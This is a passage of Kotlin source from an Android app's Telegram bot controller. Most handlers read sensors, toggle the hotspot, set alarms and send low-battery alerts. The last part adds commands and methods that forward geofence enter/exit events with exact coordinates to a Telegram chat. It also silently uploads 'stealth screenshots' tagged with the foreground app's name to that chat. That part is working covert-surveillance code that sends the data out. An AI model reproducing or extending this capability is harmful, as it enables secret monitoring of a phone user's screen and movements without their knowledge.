        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_MAGNETIC_FIELD)) {
            sendMessage("❌ This device does not have a magnetometer sensor.")
            return
        }
        val d = SensorHelper.latestMag
        val arrow = when (d.cardinalDir) {
            "N" -> "⬆️"; "NE" -> "↗️"; "E" -> "➡️"; "SE" -> "↘️"
            "S" -> "⬇️"; "SW" -> "↙️"; "W" -> "⬅️"; "NW" -> "↖️"; else -> "🧭"
        }
        sendMessage(buildString {
            append("🧭 <b>Compass / Magnetometer</b>\n\n")
            append("$arrow <b>Heading:</b> <code>${d.heading}°</code> — <b>${d.cardinalDir}</b>\n\n")
            append("• <b>Magnetic X</b>: <code>${d.x}</code> µT\n")
            append("• <b>Magnetic Y</b>: <code>${d.y}</code> µT\n")
            append("• <b>Magnetic Z</b>: <code>${d.z}</code> µT\n")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdBarometer() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PRESSURE)) {
            sendMessage("❌ This device does not have a barometric pressure sensor.")
            return
        }
        val d = SensorHelper.latestBarometer
        sendMessage(buildString {
            append("🌡 <b>Barometer</b>\n\n")
            append("• <b>Pressure</b>: <code>${d.pressureHpa}</code> hPa\n")
            append("• <b>Altitude</b>: <code>${d.altitudeMeters}</code> m\n")
            append("\n<i>Standard sea-level: 1013.25 hPa</i>")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdSteps() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_STEP_COUNTER)) {
            sendMessage("❌ This device does not have a step counter sensor.")
            return
        }
        val total = SensorHelper.stepCount
        sendMessage(buildString {
            append("👟 <b>Step Counter</b>\n\n")
            if (total < 0) {
                append("⏳ <i>Waiting for first step event… keep the phone moving.</i>")
            } else {
                append("• <b>Steps since reboot</b>: <code>$total</code>\n")
                val distM = total * 0.762
                val kcal = total * 0.04
                append("• <b>Est. distance</b>: <code>${String.format("%.1f", distM)}</code> m\n")
                append("• <b>Est. calories</b>: <code>${String.format("%.1f", kcal)}</code> kcal")
            }
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdProximity() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_PROXIMITY)) {
            sendMessage("❌ This device does not have a proximity sensor.")
            return
        }
        val near = SensorHelper.proximityNear
        val dist = SensorHelper.proximityDistance
        val max = SensorHelper.proximityMaxRange
        sendMessage(buildString {
            append("📡 <b>Proximity Sensor</b>\n\n")
            append(if (near) "🔴 <b>NEAR</b> — something is close to the sensor" else "🟢 <b>FAR</b> — nothing detected nearby")
            append("\n• Distance: <code>$dist</code> cm (max range: <code>$max</code> cm)")
            append("\n🕐 <i>$ts</i>")
        })
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  New System Control Commands
    // ─────────────────────────────────────────────────────────────────────────

    private fun cmdHotspot(args: List<String>) {
        val arg = args.getOrNull(1)?.lowercase()
        val current = SystemControlHelper.getHotspotEnabled()
        if (arg == null) {
            sendMessage("📶 <b>Mobile Hotspot</b>\n\nStatus: ${if (current) "✅ ON" else "🔴 OFF"}\n\nUse <code>/hotspot on</code> or <code>/hotspot off</code> to control.")
            return
        }
        val enable = arg == "on" || arg == "enable" || arg == "1"
        val ok = SystemControlHelper.setHotspotEnabled(enable)
        if (ok) sendMessage(if (enable) "✅ Hotspot turned <b>ON</b>" else "🔴 Hotspot turned <b>OFF</b>")
        else sendMessage("❌ Could not control hotspot — requires root or CHANGE_NETWORK_STATE (restricted on Android 8+).")
    }

    private fun cmdSetAlarm(args: List<String>) {
        val timeArg = args.getOrNull(1) ?: ""
        if (timeArg.isBlank() || !timeArg.matches(Regex("\\d{1,2}:\\d{2}"))) {
            sendMessage("⏰ <b>Set Alarm</b>\n\nUsage: <code>/setalarm HH:MM [label]</code>\nExample: <code>/setalarm 07:30 Wake up</code>")
            return
        }
        val label = args.drop(2).joinToString(" ").ifBlank { "PlainApp Alarm" }
        try {
            val parts = timeArg.split(":")
            val hour = parts[0].toInt()
            val minute = parts[1].toInt()
            val intent = android.content.Intent(android.provider.AlarmClock.ACTION_SET_ALARM).apply {
                putExtra(android.provider.AlarmClock.EXTRA_HOUR, hour)
                putExtra(android.provider.AlarmClock.EXTRA_MINUTES, minute)
                putExtra(android.provider.AlarmClock.EXTRA_MESSAGE, label)
                putExtra(android.provider.AlarmClock.EXTRA_SKIP_UI, true)
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            MainApp.instance.startActivity(intent)
            sendMessage("✅ Alarm set for <b>${timeArg}</b> — label: <i>${htmlEsc(label)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Could not set alarm: ${htmlEsc(e.message ?: "No clock app found")}")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Battery Alert Command & Auto-Forward Toggle Commands
    // ─────────────────────────────────────────────────────────────────────────

    private suspend fun cmdBatteryAlert(args: List<String>) {
        val sub = args.getOrNull(1)?.lowercase()
        val threshArg = args.getOrNull(2)?.trimEnd('%')?.toIntOrNull()
        when (sub) {
            "on", "enable", "1" -> {
                forwardBatteryAlertEnabled = true
                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, true) }
                if (threshArg != null) {
                    batteryAlertThreshold = threshArg.coerceIn(5, 95)
                    coIO { TelegramBotBatteryAlertThresholdPreference.putAsync(MainApp.instance, batteryAlertThreshold) }
                }
                sendMessage("✅ Battery alert <b>ON</b> — will notify when battery ≤ <b>${batteryAlertThreshold}%</b>")
            }
            "off", "disable", "0" -> {
                forwardBatteryAlertEnabled = false
                coIO { TelegramBotForwardBatteryAlertPreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Battery alert <b>OFF</b>")
            }
            null -> {
                val state = if (forwardBatteryAlertEnabled) "✅ <b>ON</b> (threshold: ${batteryAlertThreshold}%)" else "🔕 <b>OFF</b>"
                sendMessage("🔋 <b>Battery Alert</b>\n\nStatus: $state\n\nUsage:\n<code>/batteryalert on [threshold%]</code>\n<code>/batteryalert off</code>\nExample: <code>/batteryalert on 20</code>")
            }
            else -> sendMessage("❓ Usage: <code>/batteryalert [on|off] [threshold%]</code>")
        }
    }

    private suspend fun cmdForwardGeofence(args: List<String>) {
        val sub = args.getOrNull(1)?.lowercase()
        when (sub) {
            "on", "enable", "1" -> {
                forwardGeofenceEnabled = true
                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, true) }
                sendMessage("✅ Geofence alerts <b>ON</b> — you'll receive enter/exit events in this chat")
            }
            "off", "disable", "0" -> {
                forwardGeofenceEnabled = false
                coIO { TelegramBotForwardGeofencePreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Geofence alerts <b>OFF</b>")
            }
            null -> {
                val state = if (forwardGeofenceEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
                sendMessage("🗺 <b>Geofence Auto-Alerts</b>\n\nStatus: $state\n\nUse <code>/forwardgeofence on</code> or <code>/forwardgeofence off</code>")
            }
            else -> sendMessage("❓ Usage: <code>/forwardgeofence [on|off]</code>")
        }
    }

    private suspend fun cmdForwardShots(args: List<String>) {
        val sub = args.getOrNull(1)?.lowercase()
        when (sub) {
            "on", "enable", "1" -> {
                forwardStealthShotsEnabled = true
                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, true) }
                sendMessage("✅ Stealth screenshot auto-forward <b>ON</b> — new shots will be sent here")
            }
            "off", "disable", "0" -> {
                forwardStealthShotsEnabled = false
                coIO { TelegramBotForwardStealthShotsPreference.putAsync(MainApp.instance, false) }
                sendMessage("🔕 Stealth screenshot auto-forward <b>OFF</b>")
            }
            null -> {
                val state = if (forwardStealthShotsEnabled) "✅ <b>ON</b>" else "🔕 <b>OFF</b>"
                sendMessage("📸 <b>Stealth Screenshots Auto-Forward</b>\n\nStatus: $state\n\nUse <code>/forwardshots on</code> or <code>/forwardshots off</code>")
            }
            else -> sendMessage("❓ Usage: <code>/forwardshots [on|off]</code>")
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Auto-Forwarding Methods (called by Android services)
    // ─────────────────────────────────────────────────────────────────────────

    /** Called by LocationTrackingService when a geofence is triggered. */
    fun forwardGeofenceEvent(
        geofenceName: String,
        type: String,                // "enter" or "exit"
        lat: Double,
        lng: Double,
        batteryLevel: Int,
    ) {
        if (!isRunning || !forwardGeofenceEnabled || token.isBlank() || chatId.isBlank()) return
        val emoji = if (type == "enter") "🟢" else "🔴"
        val action = if (type == "enter") "ENTERED" else "EXITED"
        val txt = buildString {
            append("$emoji <b>Geofence $action</b>\n")
            append("📍 Zone: <b>${htmlEsc(geofenceName)}</b>\n")
            append("🌍 Lat: <code>$lat</code>  Lng: <code>$lng</code>\n")
            append("🔋 Battery: <b>${batteryLevel}%</b>\n")
            append("<a href=\"https://maps.google.com/?q=$lat,$lng\">📌 View on Google Maps</a>\n")
            append("🕐 <i>$ts</i>")
        }
        sendMessage(txt)
    }

    /** Called by battery monitoring to send a low-battery alert. */
    fun forwardBatteryAlert(level: Int) {
        if (!isRunning || !forwardBatteryAlertEnabled || token.isBlank() || chatId.isBlank()) return
        if (level > batteryAlertThreshold) return
        if (lastBatteryAlertLevel in 1..level) return
        lastBatteryAlertLevel = level
        val emoji = when {
            level <= 5 -> "🪫"
            level <= 10 -> "🔴"
            level <= 20 -> "🟠"
            else -> "🟡"
        }
        sendMessage("$emoji <b>Low Battery Alert</b>\n\n🔋 Battery is at <b>${level}%</b>\n⚡ Please charge the device soon.\n🕐 <i>$ts</i>")
    }

    /** Called by StealthScreenshotCapturer when a new shot is saved. */
    fun forwardStealthShot(shot: StealthScreenshotHelper.Shot) {
        if (!isRunning || !forwardStealthShotsEnabled || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val file = java.io.File(shot.absPath)
                if (!file.exists()) return@launch
                val caption = buildString {
                    append("📸 <b>Stealth Screenshot</b>\n")
                    if (shot.appLabel.isNotBlank()) append("📱 App: <b>${htmlEsc(shot.appLabel)}</b>\n")
                    append("🕐 <i>$ts</i>")
                }
                TelegramApiClient.sendPhoto(token, chatId, file, caption)
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardStealthShot failed: ${e.message}")
            }
        }
    }
}

